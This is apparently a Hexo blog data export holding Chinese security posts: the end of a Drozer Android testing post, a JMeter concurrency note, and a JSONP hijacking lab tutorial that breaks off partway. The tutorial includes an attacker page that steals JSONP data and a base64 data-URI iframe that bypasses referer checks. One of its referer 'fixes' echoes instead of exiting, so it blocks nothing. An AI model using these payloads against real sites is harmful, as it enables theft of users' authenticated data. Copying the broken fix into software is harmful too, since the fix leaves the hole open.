alt=\"image-20200628200729336\"></p>\n<p>如果漏洞存在会提醒</p>\n<p><img src=\"/images/drozer/image-20200628200810091.png\" alt=\"image-20200628200810091\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上总结其实网络上也有很多，只是想总结出来后让自己能明白和了解到关于Android应用组件的检测项及涉及工具。当然Drozer这款综合型检测框架还有很多值得学习，比如写一些模块让检测更加自动化。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://showmeshell.top/2018/09/28/How-to-use-drozer/</span><br><span class=\"line\">https://bbs.pediy.com/thread-219107.htm</span><br></pre></td></tr></table></figure>\n"},{"title":"JMeter高并发","date":"2020-04-15T01:01:38.000Z","_content":"JMeter想必大家都比较熟悉,一款高并发测试工具.为什么今天要介绍它呢?不说了,都是泪.\n\n### 始末\n\n因进行安全测试未进行高并发测试而被薅羊毛,所以后来及时跟进并复测.导致出现被薅的原因是高并发请求致使数据库锁表,进来部分脏数据(刷红包),所以在这也提醒测试同事记得进行高并发测试.祝好运!\n\n### 地址\n\n文档推到github上了,可进行查看(不包含复测URL,但基本一致).\n\n[[JMeter原理及使用介绍](https://github.com/si1ent-le/JMeter/blob/master/JMeter使用.md)]","source":"_posts/JMeter高并发.md","raw":"---\ntitle: JMeter高并发\ndate: 2020-04-15 09:01:38\ntags:\n - JMeter\n---\nJMeter想必大家都比较熟悉,一款高并发测试工具.为什么今天要介绍它呢?不说了,都是泪.\n\n### 始末\n\n因进行安全测试未进行高并发测试而被薅羊毛,所以后来及时跟进并复测.导致出现被薅的原因是高并发请求致使数据库锁表,进来部分脏数据(刷红包),所以在这也提醒测试同事记得进行高并发测试.祝好运!\n\n### 地址\n\n文档推到github上了,可进行查看(不包含复测URL,但基本一致).\n\n[[JMeter原理及使用介绍](https://github.com/si1ent-le/JMeter/blob/master/JMeter使用.md)]","slug":"JMeter高并发","published":1,"updated":"2020-10-23T03:35:48.093Z","_id":"ckglobhdh0007b1hq690q0gid","comments":1,"layout":"post","photos":[],"link":"","content":"<p>JMeter想必大家都比较熟悉,一款高并发测试工具.为什么今天要介绍它呢?不说了,都是泪.</p>\n<h3 id=\"始末\"><a href=\"#始末\" class=\"headerlink\" title=\"始末\"></a>始末</h3><p>因进行安全测试未进行高并发测试而被薅羊毛,所以后来及时跟进并复测.导致出现被薅的原因是高并发请求致使数据库锁表,进来部分脏数据(刷红包),所以在这也提醒测试同事记得进行高并发测试.祝好运!</p>\n<h3 id=\"地址\"><a href=\"#地址\" class=\"headerlink\" title=\"地址\"></a>地址</h3><p>文档推到github上了,可进行查看(不包含复测URL,但基本一致).</p>\n<p>[<a href=\"https://github.com/si1ent-le/JMeter/blob/master/JMeter%E4%BD%BF%E7%94%A8.md\">JMeter原理及使用介绍</a>]</p>\n","site":{"data":{}},"excerpt":"","more":"<p>JMeter想必大家都比较熟悉,一款高并发测试工具.为什么今天要介绍它呢?不说了,都是泪.</p>\n<h3 id=\"始末\"><a href=\"#始末\" class=\"headerlink\" title=\"始末\"></a>始末</h3><p>因进行安全测试未进行高并发测试而被薅羊毛,所以后来及时跟进并复测.导致出现被薅的原因是高并发请求致使数据库锁表,进来部分脏数据(刷红包),所以在这也提醒测试同事记得进行高并发测试.祝好运!</p>\n<h3 id=\"地址\"><a href=\"#地址\" class=\"headerlink\" title=\"地址\"></a>地址</h3><p>文档推到github上了,可进行查看(不包含复测URL,但基本一致).</p>\n<p>[<a href=\"https://github.com/si1ent-le/JMeter/blob/master/JMeter%E4%BD%BF%E7%94%A8.md\">JMeter原理及使用介绍</a>]</p>\n"},{"title":"JSONP劫持学","date":"2020-10-10T08:57:27.000Z","_content":"JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t--摘自网络\n\n### JSON介绍\n\n[JSON官网](https://www.json.org/json-zh.html)\n\nJSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。 易于人阅读和编写。同时也易于机器解析和生成。 它基于JavaScript Programming Language, Standard ECMA-262 3rd Edition - December 1999的一个子集。 JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯（包括C, C++, C#, Java, JavaScript, Perl, Python等）。 这些特性使JSON成为理想的数据交换语言.\n\n#### JSON建构于两种结构\n\n\"名称/值\"对的集合（A collection of name/value pairs）。不同的语言中，它被理解为*对象（object）*、纪录（record）、结构（struct）、字典（dictionary）、哈希表（hash table）、有键列表（keyed list），或者关联数组 （associative array）。 \n\n值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array）。\n\n这些都是常见的数据结构。事实上大部分现代计算机语言都以某种形式支持它们。这使得一种数据格式在同样基于这些结构的编程语言之间交换成为可能。\n\nJSON具有以下这些形式\n\n`对象`是一个无序的“‘名称/值’对”集合。一个对象以 {  }。每个“名称”后跟一个 \"`:`\" ；“名称/值’ 对”之间使用 ,(逗号) 分隔。\n\n![img](https://www.json.org/img/object.png)\n\n`数组`是值（value）的有序集合。一个数组以 [左中括号 开始， ]右中括号 结束。值之间使用 ,逗号分隔\n\n![img](https://www.json.org/img/array.png)\n\n`值`（*value*）可以是双引号括起来的字符串（*string*）、数值(number)、`true`、`false`、 `null`、对象（object）或者数组（array）。这些结构可以嵌套。\n\n![img](https://www.json.org/img/value.png)\n\n`字符串`（*string*）是由双引号包围的任意数量Unicode字符的集合，使用反斜线转义。一个字符（character）即一个单独的字符串（character string）。\n\n字符串（string）与C或者Java的字符串非常相似。\n\n![img](https://www.json.org/img/string.png)\n\n`数值`（*number*）也与C或者Java的数值非常相似。除去未曾使用的八进制与十六进制格式。除去一些编码细节。\n\n![img](https://www.json.org/img/number.png)\n\n空白可以加入到任何符号之间。 以下描述了完整的语言。\n\n![img](https://www.json.org/img/whitespace.png)\n\n### JSONP介绍\n\nJSONP(JSON with Padding) 是 JSON 的一种\"使用模式\"，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。\n\n为什么我们从不同的域（网站）访问数据需要一个特殊的技术( JSONP )呢？这是因为同源策略的限制。\n\n`同源策略`，它是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。\n\n文件存放另一域名下：\n\n`http://yourls.me:4444/json.txt`\n\n![image-20200627094956151](/images/jsonp/image-20200627094956151.png)\n\n#### XHR调用\n\n`http://bwapp.me:4444/bwAPP/xhr.html`\n\n````php+HTML\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XHR</title>\n</head>\n<script>\n    var request = new XMLHttpRequest();\n\n    request.onreadystatechange = function () {\n        if (request.readyState === 4) {\n            if (request.status === 200) {\n                alert('success!');\n            }\n        }\n    }\n    request.open('GET', 'http://yourls.me:4444/json.txt');\n    request.send();\n</script>\n<body>\n</body>\n</html>\n````\n\n会因跨域而被浏览器拦截（因同源策略原因无法直接获取其他主机文档信息）\n\n![image-20200627094956151](/images/jsonp/image-20200627094603295.png)\n\n#### 跨域访问\n\n1、html在这个域名下\n\n`http://bwapp.me:4444/data.html`\n\n```html\n<html>\n<head>\n<title>Test</title>\n</head>\n<body>\n<script>\nfunction test(data){\n    alert(\"name:\"+data.name+\"\\n\"\"age:\"+data.age);\n}\n</script>\n<script src=\"http://yourls.me:4444/data.js\"></script>\n</body>\n</html>\n```\n\n2、JS文件在此域名下\n\n`http://yourls.me:4444/data.js`\n\n![image-20200627114105044](/images/jsonp/image-20200627114105044.png)\n\n3、访问`http://bwapp.me:4444/data.html`跨域访问成功\n\n![image-20200627114330651](/images/jsonp/image-20200627114330651.png)\n\n#### 问题\n\nbwapp.me直接获取data.js内的数据，因data.js内只有一个函数，如涉及多个函数，data.html(客户端)将导致客户端无法确定调哪个函数。而无法输出对应数据。\n\ndata.html\n\n```html\n<html>\n<head>\n<title>Test</title>\n</head>\n<body>\n<script>\nfunction test(data){\n    alert(\"name:\"+data.name+\"age:\"+data.age);\n}\n//新建一个test1函数\nfunction test1(test3) {\n    alert(\"name:\"=test3.name+\"city:\"+test3.city);\n}\n</script>\n//访问后并不能直接输出对应数据信息。\n<script src=\"http://yourls.me:4444/data.js\"></script>\n</body>\n</html>\n```\n\n#### JSONP动态调用\n\n在客户端中添加callback回调函数\n\ndata.html\n\n```html\n<html>\n<head>\n    <title>Test</title>\n</head>\n<body>\n    <script>\n        function test1(data) {\n            alert(\"name:\" + data.name + \"city:\" + data.city);\n        }\n        function test2(data) {\n            alert(\"name:\" + data.name);\n        }\n    </script>\n    <script src=\"http://yourls.me:4444/data.php?callback=test1&name=si1ent\"></script>\n    <!--<script src=\"http://yourls.me:4444/data.php?callback=test1&name=si1ent\"></script>-->\n</body>\n</html>\n```\n\ndata.php\n\n```php\n<?php\n$data1=array(\"name\"=>\"si1ent\",\"city\"=>\"Anhui\");\n$data2=array(\"name\"=>\"admin\",\"city\"=>\"SH\");\nif ($_GET['name']==='si1ent') {\n    $data=$data1;\n}\n\nif ($_GET['name']==='admin') {\n    $data=$data2;\n}\n$callback = $_GET['callback'];\nexit($callback.\"(\".json_encode($data).\")\");\n?>\n```\n\n访问\n\n`http://bwapp.me:4444/data.html`\n\n`http://yourls.me:4444/data.php?callback=test1&name=si1ent`\n\n![image-20200627134931765](/images/jsonp/image-20200627134931765.png)\n\n注：\n\n因前后端都存在两条以上数据，这里指定了callback==test1因此会弹出名字及城市信息。\n\n如callback=test2，则只会显示name对应值，不显示城市信息。\n\n![image-20200627135745378](/images/jsonp/image-20200627135745378.png)\n\n#### jQuery调用JSONP\n\n```php+HTML\n<!DOCTYPE html >\n<html>\n<head>\n<title>Test</title>\n</head>\n<body>\n<script src=\"http://libs.baidu.com/jquery/1.9.0/jquery.js\" type=\"text/javascript\"></script>\n</script>\n<script type=\"text/javascript\">\n    $(document).ready(function(){\n        $.ajax({\n             type: \"get\",\n             url: \"http://yourls.me:4444/data.php?name=admin\",\n             dataType: \"jsonp\",\n             jsonp: \"callback\",//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)\n             jsonpCallback:\"test1\",//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写\"?\"，jQuery会自动为你处理数据\n             success: function(data){\n                 alert(\"name:\"+data.name+\"city:\"+data.city);\n             },\n             error: function(){\n                 alert('fail');\n             }\n        });\n    });\n</script>\n</body>\n</html>\n```\n\n![image-20200627140710365](/images/jsonp/image-20200627140710365.png)\n\njQuery会自动调用callback函数。\n\n#### 小结\n\n由以上实例及演示得知，JSONP是为了解决跨域而传输JSON格式数据的一种方式。\n\n### 安全\n\n#### JSONP劫持\n\nJSONP本质上属于CSRF(跨站请求伪造：利用更多是修改密码等攻击)，而JSONP主要是攻击目标站点并获取数据的一种攻击方式。\n\n而造成这一问题的主要原因：目标站点未对请求的referer进行限制和检查，导致任何站点都可以访问JSON数据。\n\n#### 攻击流程\n\n后台数据还是以data.php`http://yourls.me:4444/data.php`为主，而此时referer不再是`http://bwapp.me:4444/`而是新的地址`http://jsonp.me:4444/`\n\n 新建jsonp.html文件（放到`http://jsonp.me:4444/`下）\n\n```html\n<html>\n<script>\nfunction csrf(data){\n    alert(\"name:\"+data.name+\"city:\"+data.city);\n}\n</script>\n<script src=\"http://yourls.me:4444/data.php?callback=csrf&name=admin\">\n</script>\n</html>\n```\n\n结果\n\n`http://jsonp.me:4444/jsonp.html`\n\n![image-20200627142742830](/images/jsonp/image-20200627142742830.png)\n\n#### 修复\n\n1、限制referer\n\n```php\nif ($_SERVER['HTTP_REFERER']!=='http://bwapp.me:4444/jquery.html') {\n    exit(\"非法访问\");\n}\n```\n\n以下简单添加referer验证\n\n```php\n<?php\n$data1=array(\"name\"=>\"si1ent\",\"city\"=>\"Anhui\");\n$data2=array(\"name\"=>\"admin\",\"city\"=>\"SH\");\nif ($_SERVER['HTTP_REFERER']!=='http://bwapp.me:4444/jquery.html') {\n    echo(\"非法访问\");\n}\nif ($_GET['name']==='si1ent') {\n    $data=$data1;\n}\n\nif ($_GET['name']==='admin') {\n    $data=$data2;\n}\n$callback = $_GET['callback'];\nexit($callback.\"(\".json_encode($data).\")\");\n?>\n```\n\n![image-20200627145813752](/images/jsonp/image-20200627145813752.png)\n\n2、使用token\n\n随机的生成一段token值，每次提交表单都要检查，攻击者没有token就不能访问（token后台服务随机分配）\n\n#### 绕过方式\n\n利用`ftp://,http://,https://,file://,javascript:,data:`这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。\n\n```html\n<html>\n    <body>\n       <iframe src=\"data:text/html;base64,PHNjcmlwdD4KZnVuY3Rpb24gY3NyZihkYXRhKXsKICAgIGFsZXJ0KCJuYW1lOiIrZGF0YS5uYW1lKyJjaXR5OiIrZGF0YS5jaXR5KTsKfQo8L3NjcmlwdD4KPHNjcmlwdCBzcmM9Imh0dHA6Ly95b3VybHMubWU6NDQ0NC9kYXRhLnBocD9jYWxsYmFjaz1jc3JmJm5hbWU9YWRtaW4iPgo8L3NjcmlwdD4=\">\n    </body>\n</html>\n```\n\n### 参考\n\n```\nhttps://www.smi1e.top/%E6%B5%85%E8%B0%88-jsonp/\nhttps://xz.aliyun.com/t/6539\nhttps://blog.knownsec.com/2015/03/jsonp_security_technic/\n之前乌云drops文档\n```\n","source":"_posts/JSONP劫持学习.md","raw":"---\ntitle: JSONP劫持学\ndate: 2020-10-10 16:57:27\ntags:\n - JSONP\n---\nJSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t--摘自网络\n\n### JSON介绍\n\n[JSON官网](https://www.json.org/json-zh.html)\n\nJSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。 易于人阅读和编写。同时也易于机器解析和生成。 它基于JavaScript Programming Language, Standard ECMA-262 3rd Edition - December 1999的一个子集。 JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯（包括C, C++, C#, Java, JavaScript, Perl, Python等）。 这些特性使JSON成为理想的数据交换语言.\n\n#### JSON建构于两种结构\n\n\"名称/值\"对的集合（A collection of name/value pairs）。不同的语言中，它被理解为*对象（object）*、纪录（record）、结构（struct）、字典（dictionary）、哈希表（hash table）、有键列表（keyed list），或者关联数组 （associative array）。 \n\n值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array）。\n\n这些都是常见的数据结构。事实上大部分现代计算机语言都以某种形式支持它们。这使得一种数据格式在同样基于这些结构的编程语言之间交换成为可能。\n\nJSON具有以下这些形式\n\n`对象`是一个无序的“‘名称/值’对”集合。一个对象以 {  }。每个“名称”后跟一个 \"`:`\" ；“名称/值’ 对”之间使用 ,(逗号) 分隔。\n\n![img](https://www.json.org/img/object.png)\n\n`数组`是值（value）的有序集合。一个数组以 [左中括号 开始， ]右中括号 结束。值之间使用 ,逗号分隔\n\n![img](https://www.json.org/img/array.png)\n\n`值`（*value*）可以是双引号括起来的字符串（*string*）、数值(number)、`true`、`false`、 `null`、对象（object）或者数组（array）。这些结构可以嵌套。\n\n![img](https://www.json.org/img/value.png)\n\n`字符串`（*string*）是由双引号包围的任意数量Unicode字符的集合，使用反斜线转义。一个字符（character）即一个单独的字符串（character string）。\n\n字符串（string）与C或者Java的字符串非常相似。\n\n![img](https://www.json.org/img/string.png)\n\n`数值`（*number*）也与C或者Java的数值非常相似。除去未曾使用的八进制与十六进制格式。除去一些编码细节。\n\n![img](https://www.json.org/img/number.png)\n\n空白可以加入到任何符号之间。 以下描述了完整的语言。\n\n![img](https://www.json.org/img/whitespace.png)\n\n### JSONP介绍\n\nJSONP(JSON with Padding) 是 JSON 的一种\"使用模式\"，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。\n\n为什么我们从不同的域（网站）访问数据需要一个特殊的技术( JSONP )呢？这是因为同源策略的限制。\n\n`同源策略`，它是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。\n\n文件存放另一域名下：\n\n`http://yourls.me:4444/json.txt`\n\n![image-20200627094956151](/images/jsonp/image-20200627094956151.png)\n\n#### XHR调用\n\n`http://bwapp.me:4444/bwAPP/xhr.html`\n\n````php+HTML\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XHR</title>\n</head>\n<script>\n    var request = new XMLHttpRequest();\n\n    request.onreadystatechange = function () {\n        if (request.readyState === 4) {\n            if (request.status === 200) {\n                alert('success!');\n            }\n        }\n    }\n    request.open('GET', 'http://yourls.me:4444/json.txt');\n    request.send();\n</script>\n<body>\n</body>\n</html>\n````\n\n会因跨域而被浏览器拦截（因同源策略原因无法直接获取其他主机文档信息）\n\n![image-20200627094956151](/images/jsonp/image-20200627094603295.png)\n\n#### 跨域访问\n\n1、html在这个域名下\n\n`http://bwapp.me:4444/data.html`\n\n```html\n<html>\n<head>\n<title>Test</title>\n</head>\n<body>\n<script>\nfunction test(data){\n    alert(\"name:\"+data.name+\"\\n\"\"age:\"+data.age);\n}\n</script>\n<script src=\"http://yourls.me:4444/data.js\"></script>\n</body>\n</html>\n```\n\n2、JS文件在此域名下\n\n`http://yourls.me:4444/data.js`\n\n![image-20200627114105044](/images/jsonp/image-20200627114105044.png)\n\n3、访问`http://bwapp.me:4444/data.html`跨域访问成功\n\n![image-20200627114330651](/images/jsonp/image-20200627114330651.png)\n\n#### 问题\n\nbwapp.me直接获取data.js内的数据，因data.js内只有一个函数，如涉及多个函数，data.html(客户端)将导致客户端无法确定调哪个函数。而无法输出对应数据。\n\ndata.html\n\n```html\n<html>\n<head>\n<title>Test</title>\n</head>\n<body>\n<script>\nfunction test(data){\n    alert(\"name:\"+data.name+\"age:\"+data.age);\n}\n//新建一个test1函数\nfunction test1(test3) {\n    alert(\"name:\"=test3.name+\"city:\"+test3.city);\n}\n</script>\n//访问后并不能直接输出对应数据信息。\n<script src=\"http://yourls.me:4444/data.js\"></script>\n</body>\n</html>\n```\n\n#### JSONP动态调用\n\n在客户端中添加callback回调函数\n\ndata.html\n\n```html\n<html>\n<head>\n    <title>Test</title>\n</head>\n<body>\n    <script>\n        function test1(data) {\n            alert(\"name:\" + data.name + \"city:\" + data.city);\n        }\n        function test2(data) {\n            alert(\"name:\" + data.name);\n        }\n    </script>\n    <script src=\"http://yourls.me:4444/data.php?callback=test1&name=si1ent\"></script>\n    <!--<script src=\"http://yourls.me:4444/data.php?callback=test1&name=si1ent\"></script>-->\n</body>\n</html>\n```\n\ndata.php\n\n```php\n<?php\n$data1=array(\"name\"=>\"si1ent\",\"city\"=>\"Anhui\");\n$data2=array(\"name\"=>\"admin\",\"city\"=>\"SH\");\nif ($_GET['name']==='si1ent') {\n    $data=$data1;\n}\n\nif ($_GET['name']==='admin') {\n    $data=$data2;\n}\n$callback = $_GET['callback'];\nexit($callback.\"(\".json_encode($data).\")\");\n?>\n```\n\n访问\n\n`http://bwapp.me:4444/data.html`\n\n`http://yourls.me:4444/data.php?callback=test1&name=si1ent`\n\n![image-20200627134931765](/images/jsonp/image-20200627134931765.png)\n\n注：\n\n因前后端都存在两条以上数据，这里指定了callback==test1因此会弹出名字及城市信息。\n\n如callback=test2，则只会显示name对应值，不显示城市信息。\n\n![image-20200627135745378](/images/jsonp/image-20200627135745378.png)\n\n#### jQuery调用JSONP\n\n```php+HTML\n<!DOCTYPE html >\n<html>\n<head>\n<title>Test</title>\n</head>\n<body>\n<script src=\"http://libs.baidu.com/jquery/1.9.0/jquery.js\" type=\"text/javascript\"></script>\n</script>\n<script type=\"text/javascript\">\n    $(document).ready(function(){\n        $.ajax({\n             type: \"get\",\n             url: \"http://yourls.me:4444/data.php?name=admin\",\n             dataType: \"jsonp\",\n             jsonp: \"callback\",//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)\n             jsonpCallback:\"test1\",//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写\"?\"，jQuery会自动为你处理数据\n             success: function(data){\n                 alert(\"name:\"+data.name+\"city:\"+data.city);\n             },\n             error: function(){\n                 alert('fail');\n             }\n        });\n    });\n</script>\n</body>\n</html>\n```\n\n![image-20200627140710365](/images/jsonp/image-20200627140710365.png)\n\njQuery会自动调用callback函数。\n\n#### 小结\n\n由以上实例及演示得知，JSONP是为了解决跨域而传输JSON格式数据的一种方式。\n\n### 安全\n\n#### JSONP劫持\n\nJSONP本质上属于CSRF(跨站请求伪造：利用更多是修改密码等攻击)，而JSONP主要是攻击目标站点并获取数据的一种攻击方式。\n\n而造成这一问题的主要原因：目标站点未对请求的referer进行限制和检查，导致任何站点都可以访问JSON数据。\n\n#### 攻击流程\n\n后台数据还是以data.php`http://yourls.me:4444/data.php`为主，而此时referer不再是`http://bwapp.me:4444/`而是新的地址`http://jsonp.me:4444/`\n\n 新建jsonp.html文件（放到`http://jsonp.me:4444/`下）\n\n```html\n<html>\n<script>\nfunction csrf(data){\n    alert(\"name:\"+data.name+\"city:\"+data.city);\n}\n</script>\n<script src=\"http://yourls.me:4444/data.php?callback=csrf&name=admin\">\n</script>\n</html>\n```\n\n结果\n\n`http://jsonp.me:4444/jsonp.html`\n\n![image-20200627142742830](/images/jsonp/image-20200627142742830.png)\n\n#### 修复\n\n1、限制referer\n\n```php\nif ($_SERVER['HTTP_REFERER']!=='http://bwapp.me:4444/jquery.html') {\n    exit(\"非法访问\");\n}\n```\n\n以下简单添加referer验证\n\n```php\n<?php\n$data1=array(\"name\"=>\"si1ent\",\"city\"=>\"Anhui\");\n$data2=array(\"name\"=>\"admin\",\"city\"=>\"SH\");\nif ($_SERVER['HTTP_REFERER']!=='http://bwapp.me:4444/jquery.html') {\n    echo(\"非法访问\");\n}\nif ($_GET['name']==='si1ent') {\n    $data=$data1;\n}\n\nif ($_GET['name']==='admin') {\n    $data=$data2;\n}\n$callback = $_GET['callback'];\nexit($callback.\"(\".json_encode($data).\")\");\n?>\n```\n\n![image-20200627145813752](/images/jsonp/image-20200627145813752.png)\n\n2、使用token\n\n随机的生成一段token值，每次提交表单都要检查，攻击者没有token就不能访问（token后台服务随机分配）\n\n#### 绕过方式\n\n利用`ftp://,http://,https://,file://,javascript:,data:`这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。\n\n```html\n<html>\n    <body>\n       <iframe src=\"data:text/html;base64,PHNjcmlwdD4KZnVuY3Rpb24gY3NyZihkYXRhKXsKICAgIGFsZXJ0KCJuYW1lOiIrZGF0YS5uYW1lKyJjaXR5OiIrZGF0YS5jaXR5KTsKfQo8L3NjcmlwdD4KPHNjcmlwdCBzcmM9Imh0dHA6Ly95b3VybHMubWU6NDQ0NC9kYXRhLnBocD9jYWxsYmFjaz1jc3JmJm5hbWU9YWRtaW4iPgo8L3NjcmlwdD4=\">\n    </body>\n</html>\n```\n\n### 参考\n\n```\nhttps://www.smi1e.top/%E6%B5%85%E8%B0%88-jsonp/\nhttps://xz.aliyun.com/t/6539\nhttps://blog.knownsec.com/2015/03/jsonp_security_technic/\n之前乌云drops文档\n```\n","slug":"JSONP劫持学习","published":1,"updated":"2020-10-23T03:16:27.630Z","_id":"ckglobhdi0008b1hq1lle73og","comments":1,"layout":"post","photos":[],"link":"","content":"<p>JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。                                                                                        –摘自网络</p>\n<h3 id=\"JSON介绍\"><a href=\"#JSON介绍\" class=\"headerlink\" title=\"JSON介绍\"></a>JSON介绍</h3><p><a href=\"https://www.json.org/json-zh.html\">JSON官网</a></p>\n<p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。 易于人阅读和编写。同时也易于机器解析和生成。 它基于JavaScript Programming Language, Standard ECMA-262 3rd Edition - December 1999的一个子集。 JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯（包括C, C++, C#, Java, JavaScript, Perl, Python等）。 这些特性使JSON成为理想的数据交换语言.</p>\n<h4 id=\"JSON建构于两种结构\"><a href=\"#JSON建构于两种结构\" class=\"headerlink\" title=\"JSON建构于两种结构\"></a>JSON建构于两种结构</h4><p>“名称/值”对的集合（A collection of name/value pairs）。不同的语言中，它被理解为<em>对象（object）</em>、纪录（record）、结构（struct）、字典（dictionary）、哈希表（hash table）、有键列表（keyed list），或者关联数组 （associative array）。 </p>\n<p>值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array）。</p>\n<p>这些都是常见的数据结构。事实上大部分现代计算机语言都以某种形式支持它们。这使得一种数据格式在同样基于这些结构的编程语言之间交换成为可能。</p>\n<p>JSON具有以下这些形式</p>\n<p><code>对象</code>是一个无序的“‘名称/值’对”集合。一个对象以 {  }。每个“名称”后跟一个 “<code>:</code>“ ；“名称/值’ 对”之间使用 ,(逗号) 分隔。</p>\n<p><img src=\"https://www.json.org/img/object.png\" alt=\"img\"></p>\n<p><code>数组</code>是值（value）的有序集合。一个数组以 [左中括号 开始， ]右中括号 结束。值之间使用 ,逗号分隔</p>\n<p><img src=\"https://www.json.org/img/array.png\" alt=\"img\"></p>\n<p><code>值</code>（<em>value</em>）可以是双引号括起来的字符串（<em>string</em>）、数值(number)、<code>true</code>、<code>false</code>、 <code>null</code>、对象（object）或者数组（array）。这些结构可以嵌套。</p>\n<p><img src=\"https://www.json.org/img/value.png\" alt=\"img\"></p>\n<p><code>字符串</code>（<em>string</em>）是由双引号包围的任意数量Unicode字符的集合，使用反斜线转义。一个字符（character）即一个单独的字符串（character string）。</p>\n<p>字符串（string）与C或者Java的字符串非常相似。</p>\n<p><img src=\"https://www.json.org/img/string.png\" alt=\"img\"></p>\n<p><code>数值</code>（<em>number</em>）也与C或者Java的数值非常相似。除去未曾使用的八进制与十六进制格式。除去一些编码细节。</p>\n<p><img src=\"https://www.json.org/img/number.png\" alt=\"img\"></p>\n<p>空白可以加入到任何符号之间。 以下描述了完整的语言。</p>\n<p><img src=\"https://www.json.org/img/whitespace.png\" alt=\"img\"></p>\n<h3 id=\"JSONP介绍\"><a href=\"#JSONP介绍\" class=\"headerlink\" title=\"JSONP介绍\"></a>JSONP介绍</h3><p>JSONP(JSON with Padding) 是 JSON 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p>\n<p>为什么我们从不同的域（网站）访问数据需要一个特殊的技术( JSONP )呢？这是因为同源策略的限制。</p>\n<p><code>同源策略</code>，它是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。</p>\n<p>文件存放另一域名下：</p>\n<p><code>http://yourls.me:4444/json.txt</code></p>\n<p><img src=\"/images/jsonp/image-20200627094956151.png\" alt=\"image-20200627094956151\"></p>\n<h4 id=\"XHR调用\"><a href=\"#XHR调用\" class=\"headerlink\" title=\"XHR调用\"></a>XHR调用</h4><p><code>http://bwapp.me:4444/bwAPP/xhr.html</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;XHR&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    var request &#x3D; new XMLHttpRequest();</span><br><span class=\"line\"></span><br><span class=\"line\">    request.onreadystatechange &#x3D; function () &#123;</span><br><span class=\"line\">        if (request.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class=\"line\">            if (request.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class=\"line\">                alert(&#39;success!&#39;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    request.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;yourls.me:4444&#x2F;json.txt&#39;);</span><br><span class=\"line\">    request.send();</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br><span 